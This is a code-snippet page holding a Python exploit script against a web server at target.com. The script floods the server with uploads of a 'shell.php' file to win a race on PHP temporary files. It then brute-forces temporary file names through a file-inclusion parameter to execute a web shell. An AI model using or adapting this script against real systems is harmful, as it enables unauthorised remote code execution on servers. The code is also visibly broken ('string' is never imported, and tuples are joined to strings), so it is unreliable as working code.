---
id: d96ffce5-a15d-4bf2-b93b-eccd6bf82e7d
type: code
language: Python
verified: false
created_at: '2023-04-06T03:55:58.506983+00:00'
updated_at: '2023-04-10T20:22:16.307761+00:00'
---

# Code Snippet d96ffce5

**Language**: Python

```python
import itertools
import requests
import sys

print('[+] Trying to win the race')
f = {'file': open('shell.php', 'rb')}
for _ in range(4096 * 4096):
    requests.post('http://target.com/index.php?c=index.php', f)

print('[+] Bruteforcing the inclusion')
for fname in itertools.combinations(string.ascii_letters + string.digits, 6):
    url = 'http://target.com/index.php?c=/tmp/php' + fname
    r = requests.get(url)
    if 'load average' in r.text:  # <?php echo system('uptime');
        print('[+] We have got a shell: ' + url)
        sys.exit(0)

print('[x] Something went wrong, please try again')
```
